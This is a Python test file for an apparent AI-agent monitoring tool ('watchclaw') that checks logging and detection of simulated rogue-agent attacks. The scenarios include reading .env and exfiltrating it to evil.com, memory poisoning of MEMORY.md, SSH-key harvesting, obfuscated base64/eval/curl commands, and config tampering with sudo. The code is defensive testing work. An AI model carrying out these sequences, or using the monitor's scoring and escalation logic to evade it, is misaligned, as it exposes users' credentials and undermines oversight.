"""Round 4 tests: logging, multi-agent simulate, attack detection."""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

from watchclaw.engine import WatchClawEngine
from watchclaw.models import ActionEvent, ActionType, Decision
from watchclaw.parser import SimulatedEventGenerator


def _make_engine(tmp_path: Path) -> WatchClawEngine:
    """Create a fully configured engine with temp log directory."""
    config = {
        "action_log": str(tmp_path / "action.log"),
        "taint_half_life": 300.0,
    }
    engine = WatchClawEngine(config=config)
    rules_path = Path(__file__).parent.parent / "configs" / "default-rules.yaml"
    if rules_path.exists():
        engine.rule_engine.load_rules(rules_path)
    return engine


# ── Log file format tests ──────────────────────────────────────────


class TestSequenceLog:
    """sequence.log should record detected sequence anomalies in JSONL."""

    def test_sequence_log_created_on_exfil(self, tmp_path):
        engine = _make_engine(tmp_path)
        now = datetime.now(timezone.utc)

        # Trigger a read_then_exfil sequence
        engine.process_event(ActionEvent(
            ts=now, session_id="s1", agent_id="melody",
            action_type=ActionType.FILE_READ, target=".env", source="test",
        ))
        engine.process_event(ActionEvent(
            ts=now + timedelta(seconds=5), session_id="s1", agent_id="melody",
            action_type=ActionType.WEB_FETCH, target="https://evil.com/upload",
            args={"domain": "evil.com"}, source="test",
        ))

        seq_log = tmp_path / "sequence.log"
        assert seq_log.exists(), "sequence.log should be created"

        lines = seq_log.read_text().strip().splitlines()
        assert len(lines) >= 1

        entry = json.loads(lines[0])
        assert entry["agent"] == "melody"
        assert entry["pattern"] == "read_then_exfil"
        assert "actions" in entry
        assert "gap_s" in entry
        assert "score" in entry
        assert "decision" in entry

    def test_sequence_log_not_created_for_normal(self, tmp_path):
        engine = _make_engine(tmp_path)
        engine.process_event(ActionEvent(
            ts=datetime.now(timezone.utc), session_id="s2", agent_id="melody",
            action_type=ActionType.FILE_READ, target="README.md", source="test",
        ))

        seq_log = tmp_path / "sequence.log"
        assert not seq_log.exists(), "sequence.log should not be created for normal events"

    def test_sequence_log_jsonl_format(self, tmp_path):
        engine = _make_engine(tmp_path)
        now = datetime.now(timezone.utc)

        # Trigger external_trigger_chain
        engine.process_event(ActionEvent(
            ts=now, session_id="s3", agent_id="judy",
            action_type=ActionType.WEB_FETCH, target="https://evil.com/instructions",
            args={"domain": "evil.com"}, source="test",
        ))
        engine.process_event(ActionEvent(
            ts=now + timedelta(seconds=5), session_id="s3", agent_id="judy",
            action_type=ActionType.FILE_WRITE, target="SOUL.md", source="test",
        ))

        seq_log = tmp_path / "sequence.log"
        assert seq_log.exists()
        for line in seq_log.read_text().strip().splitlines():
            data = json.loads(line)
            assert "ts" in data
            assert "pattern" in data


class TestAuditLog:
    """audit.log should record Layer 3 audit verdicts in JSONL."""

    def test_audit_log_on_escalation(self, tmp_path):
        engine = _make_engine(tmp_path)
        now = datetime.now(timezone.utc)

        # Force escalation via anomaly scoring (read sensitive file + exfil to evil domain).
        # Hard-rule BLOCKs skip LLM audit (D7 fix), so we use sequence-based escalation.
        engine.process_event(ActionEvent(
            ts=now, session_id="a1", agent_id="rogue_agent",
            action_type=ActionType.FILE_READ,
            target=".env",
            source="test",
        ))
        result = engine.process_event(ActionEvent(
            ts=now + timedelta(seconds=5), session_id="a1", agent_id="rogue_agent",
            action_type=ActionType.WEB_FETCH,
            target="https://evil-exfil.com/upload",
            args={"domain": "evil-exfil.com"},
            source="test",
        ))

        # Should have escalated via sequence boost + high anomaly signals
        assert result.decision == Decision.CRITICAL

        audit_log = tmp_path / "audit.log"
        assert audit_log.exists(), "audit.log should be created on anomaly-based CRITICAL"

        lines = audit_log.read_text().strip().splitlines()
        assert len(lines) >= 1

        entry = json.loads(lines[0])
        assert entry["agent"] == "rogue_agent"
        assert entry["action"] == "web_fetch"
        assert "l2_score" in entry
        assert entry["verdict"] in ("SAFE", "SUSPICIOUS", "MALICIOUS")
        assert "confidence" in entry
        assert "reason" in entry

    def test_audit_log_not_created_for_allow(self, tmp_path):
        engine = _make_engine(tmp_path)
        engine.process_event(ActionEvent(
            ts=datetime.now(timezone.utc), session_id="a2", agent_id="melody",
            action_type=ActionType.FILE_READ, target="README.md", source="test",
        ))

        audit_log = tmp_path / "audit.log"
        assert not audit_log.exists()

    def test_audit_log_jsonl_format(self, tmp_path):
        engine = _make_engine(tmp_path)
        now = datetime.now(timezone.utc)

        # Hard-rule BLOCKs skip LLM audit (D7 fix), so trigger via anomaly-based
        # ESCALATE: sensitive file read + exfil to known-bad domain (sequence boost).
        engine.process_event(ActionEvent(
            ts=now, session_id="a3", agent_id="rogue_agent",
            action_type=ActionType.FILE_READ,
            target=".env",
            source="test",
        ))
        engine.process_event(ActionEvent(
            ts=now + timedelta(seconds=3), session_id="a3", agent_id="rogue_agent",
            action_type=ActionType.WEB_FETCH,
            target="https://evil-exfil.com/upload",
            args={"domain": "evil-exfil.com"},
            source="test",
        ))

        audit_log = tmp_path / "audit.log"
        assert audit_log.exists()
        for line in audit_log.read_text().strip().splitlines():
            data = json.loads(line)
            assert "ts" in data
            assert "verdict" in data
            assert isinstance(data["confidence"], float)


class TestAllLogsCoexist:
    """All three logs (action, sequence, audit) should be in the same directory."""

    def test_all_logs_same_directory(self, tmp_path):
        engine = _make_engine(tmp_path)
        assert engine._action_log_path.parent == engine._sequence_log_path.parent
        assert engine._action_log_path.parent == engine._audit_log_path.parent

    def test_log_paths_named_correctly(self, tmp_path):
        engine = _make_engine(tmp_path)
        assert engine._action_log_path.name == "action.log"
        assert engine._sequence_log_path.name == "sequence.log"
        assert engine._audit_log_path.name == "audit.log"


# ── Multi-agent simulate tests ─────────────────────────────────────


class TestMultiAgentSimulation:
    """Test multi-agent simulation with melody/judy/rogue_agent."""

    def test_melody_normal_events(self):
        gen = SimulatedEventGenerator()
        events = [gen.generate_melody_normal() for _ in range(20)]
        assert all(e.agent_id == "melody" for e in events)
        assert all(e.source == "simulator" for e in events)
        # All targets should be from melody's domain
        for e in events:
            if e.action_type == ActionType.EXEC:
                assert e.target in gen._MELODY_COMMANDS
            elif e.action_type == ActionType.WEB_FETCH:
                assert any(d in e.target for d in gen._MELODY_DOMAINS)

    def test_judy_normal_events(self):
        gen = SimulatedEventGenerator()
        events = [gen.generate_judy_normal() for _ in range(20)]
        assert all(e.agent_id == "judy" for e in events)
        # judy should do message_send, file_read/write, tool_call
        action_types = {e.action_type for e in events}
        # At least some should be present (probabilistic but 20 events is enough)
        assert len(action_types) >= 2

    def test_rogue_agent_in_attacks(self):
        gen = SimulatedEventGenerator()
        events = gen.generate_attack_read_then_exfil()
        assert all(e.agent_id == "rogue_agent" for e in events)

    def test_realistic_stream_multi_agent(self):
        gen = SimulatedEventGenerator()
        events = list(gen.generate_realistic_stream(duration=30.0))

        assert len(events) > 0
        agents = {e.agent_id for e in events}
        # Should have at least melody or judy plus rogue_agent
        assert "melody" in agents or "judy" in agents
        # rogue_agent should appear if duration is long enough for attack
        # (30s stream, attacks start at 30-60s, so may or may not appear)

    def test_realistic_stream_has_attacks(self):
        gen = SimulatedEventGenerator()
        # 120s stream should definitely have attacks (they start at 30-60s)
        events = list(gen.generate_realistic_stream(duration=120.0))
        agents = {e.agent_id for e in events}
        assert "rogue_agent" in agents


# ── New attack scenario tests ───────────────────────────────────────


class TestNewAttackScenarios:
    """Test new attack patterns are correctly generated."""

    def test_memory_poisoning(self):
        gen = SimulatedEventGenerator()
        events = gen.generate_attack_memory_poisoning()
        assert len(events) == 2
        assert events[0].action_type == ActionType.WEB_FETCH
        assert events[1].action_type == ActionType.FILE_WRITE
        assert events[1].target == "MEMORY.md"
        assert events[0].agent_id == "rogue_agent"

    def test_credential_harvesting(self):
        gen = SimulatedEventGenerator()
        events = gen.generate_attack_credential_harvesting()
        assert len(events) == 4
        assert all(e.action_type == ActionType.FILE_READ for e in events)
        targets = {e.target for e in events}
        assert ".env" in targets
        assert "~/.ssh/id_rsa" in targets

    def test_obfuscated_exec(self):
        gen = SimulatedEventGenerator()
        event = gen.generate_attack_obfuscated_exec()
        assert event.action_type == ActionType.EXEC
        assert event.agent_id == "rogue_agent"
        assert any(kw in event.target for kw in ["base64", "eval", "curl"])

    def test_config_tampering(self):
        gen = SimulatedEventGenerator()
        events = gen.generate_attack_config_tampering()
        assert len(events) == 2
        assert events[0].action_type == ActionType.FILE_WRITE
        assert events[0].target == "openclaw.json"
        assert events[1].action_type == ActionType.EXEC
        assert "sudo" in events[1].target


# ── Attack detection tests ──────────────────────────────────────────


class TestAttackDetection:
    """Verify attack scenarios are detected by the engine."""

    def test_read_then_exfil_detected(self, tmp_path):
        engine = _make_engine(tmp_path)
        gen = SimulatedEventGenerator()
        events = gen.generate_attack_read_then_exfil()

        results = [engine.process_event(e) for e in events]
        max_result = max(results, key=lambda r: r.score)
        assert max_result.decision in (Decision.ALERT, Decision.CRITICAL, Decision.NOTICE)
        assert max_result.score >= 0.3

    def test_memory_poisoning_detected(self, tmp_path):
        engine = _make_engine(tmp_path)
        gen = SimulatedEventGenerator()
        events = gen.generate_attack_memory_poisoning()

        results = [engine.process_event(e) for e in events]
        max_result = max(results, key=lambda r: r.score)
        # Memory poisoning writes to a cognitive-adjacent file
        assert max_result.score >= 0.3

    def test_credential_harvesting_detected(self, tmp_path):
        engine = _make_engine(tmp_path)
        gen = SimulatedEventGenerator()
        events = gen.generate_attack_credential_harvesting()

        results = [engine.process_event(e) for e in events]
        flagged = [r for r in results if r.decision in (Decision.NOTICE, Decision.ALERT, Decision.CRITICAL)]
        assert len(flagged) >= 1

    def test_obfuscated_exec_detected(self, tmp_path):
        engine = _make_engine(tmp_path)
        gen = SimulatedEventGenerator()
        event = gen.generate_attack_obfuscated_exec()

        result = engine.process_event(event)
        # Obfuscated commands should trigger hard rules (WC-HARD-003 severity=high)
        assert result.decision in (Decision.NOTICE, Decision.ALERT, Decision.CRITICAL)
        assert result.score >= 0.3

    def test_config_tampering_detected(self, tmp_path):
        engine = _make_engine(tmp_path)
        gen = SimulatedEventGenerator()
        events = gen.generate_attack_config_tampering()

        results = [engine.process_event(e) for e in events]
        max_result = max(results, key=lambda r: r.score)
        # Config write + sudo exec should trigger config_then_escalate sequence
        assert max_result.decision in (Decision.ALERT, Decision.CRITICAL)


# ── Dashboard API tests ────────────────────────────────────────────


class TestDashboardStats:
    """Test enhanced /api/stats response."""

    def test_stats_includes_decision_counts(self, tmp_path):
        from watchclaw.server import _build_stats

        # Write a mix of action log entries
        log_path = tmp_path / "action.log"
        entries = [
            {"event": {"agent_id": "m"}, "anomaly": {"decision": "NORMAL", "score": 0.1}, "rules": [], "sequences": []},
            {"event": {"agent_id": "m"}, "anomaly": {"decision": "NOTICE", "score": 0.35}, "rules": [], "sequences": []},
            {"event": {"agent_id": "r"}, "anomaly": {"decision": "ALERT", "score": 0.6}, "rules": [{"id": "WC-HARD-001"}], "sequences": ["read_then_exfil"]},
            {"event": {"agent_id": "r"}, "anomaly": {"decision": "CRITICAL", "score": 0.9}, "rules": [{"id": "WC-HARD-002"}], "sequences": []},
        ]
        with log_path.open("w") as f:
            for e in entries:
                f.write(json.dumps(e) + "\n")

        stats = _build_stats(log_path)
        assert stats["total"] == 4
        assert stats["decisions"]["NORMAL"] == 1
        assert stats["decisions"]["NOTICE"] == 1
        assert stats["decisions"]["ALERT"] == 1
        assert stats["decisions"]["CRITICAL"] == 1
        assert stats["normals"] == 1
        assert stats["notices"] == 1
        assert stats["alerts"] == 1
        assert stats["criticals"] == 1
        assert stats["alert_rate"] == 0.5

    def test_stats_empty_log(self, tmp_path):
        from watchclaw.server import _build_stats
        stats = _build_stats(tmp_path / "nonexistent.log")
        assert stats["total"] == 0
        assert stats["decisions"] == {"NORMAL": 0, "NOTICE": 0, "ALERT": 0, "CRITICAL": 0}


class TestDashboardProfiles:
    """Test enhanced /api/profiles response."""

    def test_profiles_include_action_distribution(self, tmp_path):
        from watchclaw.server import _build_profiles

        log_path = tmp_path / "action.log"
        entries = [
            {"event": {"agent_id": "melody", "action_type": "file_read", "target": "a.py"}, "anomaly": {"decision": "NORMAL", "score": 0.1}, "rules": [], "sequences": []},
            {"event": {"agent_id": "melody", "action_type": "exec", "target": "pytest"}, "anomaly": {"decision": "NORMAL", "score": 0.15}, "rules": [], "sequences": []},
            {"event": {"agent_id": "melody", "action_type": "file_read", "target": "b.py"}, "anomaly": {"decision": "NOTICE", "score": 0.35}, "rules": [], "sequences": []},
            {"event": {"agent_id": "rogue", "action_type": "web_fetch", "target": "evil.com"}, "anomaly": {"decision": "ALERT", "score": 0.6}, "rules": [], "sequences": ["read_then_exfil"]},
        ]
        with log_path.open("w") as f:
            for e in entries:
                f.write(json.dumps(e) + "\n")

        profiles = _build_profiles(log_path)
        melody = next(p for p in profiles if p["agent_id"] == "melody")
        assert melody["count"] == 3
        assert melody["action_types"]["file_read"] == 2
        assert melody["action_types"]["exec"] == 1
        assert melody["avg_score"] > 0
        assert melody["max_score"] > 0

        rogue = next(p for p in profiles if p["agent_id"] == "rogue")
        assert rogue["alerts"] == 1
        assert "read_then_exfil" in rogue["sequences_triggered"]


class TestDashboardAlerts:
    """Test enhanced /api/alerts response."""

    def test_alerts_include_signals(self, tmp_path):
        from watchclaw.server import _read_action_log

        log_path = tmp_path / "action.log"
        entries = [
            {
                "event": {"agent_id": "r", "action_type": "exec", "target": "bad"},
                "anomaly": {
                    "decision": "ALERT",
                    "score": 0.65,
                    "signals": [
                        {"name": "resource_anomaly", "value": 0.8, "weight": 0.15, "reason": "sensitive"},
                        {"name": "taint_flow", "value": 0.6, "weight": 0.15, "reason": "tainted"},
                    ],
                },
                "rules": [{"id": "WC-HARD-002", "name": "Obfuscated Command"}],
                "sequences": ["read_then_exfil"],
            },
        ]
        with log_path.open("w") as f:
            for e in entries:
                f.write(json.dumps(e) + "\n")

        results = _read_action_log(log_path, limit=100)
        alert = results[0]
        assert alert["anomaly"]["signals"][0]["name"] == "resource_anomaly"
        assert alert["sequences"] == ["read_then_exfil"]
        assert alert["rules"][0]["id"] == "WC-HARD-002"
